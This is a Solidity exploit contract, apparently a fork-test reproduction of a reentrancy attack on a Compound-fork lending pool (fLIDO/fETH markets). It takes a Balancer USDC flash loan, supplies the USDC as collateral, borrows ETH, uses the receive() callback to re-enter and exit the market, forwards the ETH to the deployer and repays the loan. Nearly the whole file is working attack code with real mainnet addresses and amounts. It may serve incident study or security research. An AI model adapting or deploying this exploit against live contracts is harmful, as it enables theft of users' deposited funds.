// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

// // import "forge-std/Test.sol";
// import "forge-std/console.sol";

import "../HarvestFF/interfaces/IFlashLoanReceiver.sol";
import "../HarvestFF/interfaces/ILendingPool.sol";
import "../HarvestFF/interfaces/ILendingPoolAddressesProvider.sol";
import "../HarvestFF/interfaces/IERC20.sol";

import "./interfaces/CErc20Interface.sol";
import "./interfaces/ComptrollerInterface.sol";

// fork_block_number = 14684685
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

interface IVault {
    function flashLoan(
        address receiver,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract ExploitTest {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ComptrollerInterface unitroller = ComptrollerInterface(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);
    
    CErc20Interface fLIDO = CErc20Interface(payable(0x49dA42a1EcA4AC6cA0C6943d9E5dc64e4641e0E3)); // 0xb1&#39;s Kitchen Sink USD Co... (fLIDO-127)
    CErc20Interface fDAI = CErc20Interface(payable(0x7e9cE3CAa9910cc048590801e64174957Ed41d43));
    CErc20Interface fETH = CErc20Interface(payable(0xfbD8Aaf46Ab3C2732FA930e5B343cd67cEA5054C));

    IUniswapV2Router uniswap = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // balancer protocol flash loan check
    IUSDT constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // balancer check
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; 
    IVault balancerVault = IVault(BALANCER_VAULT);

    address me;
    address ca;

    constructor() {
        me = address(msg.sender);
        ca = address(this);

        address[] memory cToken = new address[](1);
        cToken[0] = address(fLIDO);
        unitroller.enterMarkets(cToken);
    }

    function testExploit() public {
        // balancer flash loan
        IERC20[] memory tokens = new IERC20[](1);
        uint256[] memory amounts = new uint256[](1);
        
        tokens[0] = USDC;


        amounts[0] = 80000000000000000000000;

        sendFlashLoan(tokens, amounts);
    }

    receive() payable external {
        unitroller.exitMarket(address(fLIDO));
        // sender account me eth msg.value
        payable(me).transfer(msg.value);
    }

    function sendFlashLoan(IERC20[] memory tokens, uint256[] memory amounts) public {
        uint _tokens_len = tokens.length;
        uint _amounts_len = amounts.length;
        require(_tokens_len == _amounts_len, "tokens and amounts length mismatch");

        IERC20[] memory _tokens = new IERC20[](_tokens_len);
        uint256[] memory _amounts = new uint256[](_amounts_len);
        
        for (uint i = 0; i < _tokens_len; i++) {
            _tokens[i] = tokens[i];
            _amounts[i] = amounts[i];
        }
        balancerVault.flashLoan(address(this), _tokens, _amounts, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == address(balancerVault), "BalancerFlashLoan: Callback msg.sender was not the Balancer");

        // balance check
        uint256 usdcBalance = USDC.balanceOf(address(this));
        USDC.approve(address(fLIDO), ~uint256(0));

        // accureInterest 0x03296d34fd6b3619a75860f44a0d2c68336708e7 
        fLIDO.accrueInterest();
        // mint
        fLIDO.mint(usdcBalance);
        usdcBalance = USDC.balanceOf(address(this));
        
        // [call][558736][] 0x03296D34FD6B3619a75860f44a0D2C68336708e7.borrow(borrowAmount=1977579153781557429247) → (0x)
        uint256 borrowAmount = 1977579153781557429247;
        fETH.borrow(borrowAmount);
        // receive => re-enter => hack (exitMarket)

        // borrow ether balance check
        uint256 new_usdcBalance = USDC.balanceOf(address(this));
        fLIDO.approve(address(fLIDO), ~uint256(0));
        // uint256 ex_c_token = fLIDO.exchangeRateCurrent();

        // [call][99597][] [CErc20Delegator].redeemUnderlying(redeemAmount=150000000000000) → (0)
        fLIDO.redeemUnderlying(150000000000000);        
        // new_usdcBalance = USDC.balanceOf(address(this));
        // transfer repay to
        new_usdcBalance = USDC.balanceOf(address(this));
        uint256 new_fee = feeAmounts[0];
        tokens[0].transfer(msg.sender, new_usdcBalance + new_fee);       
    }
}
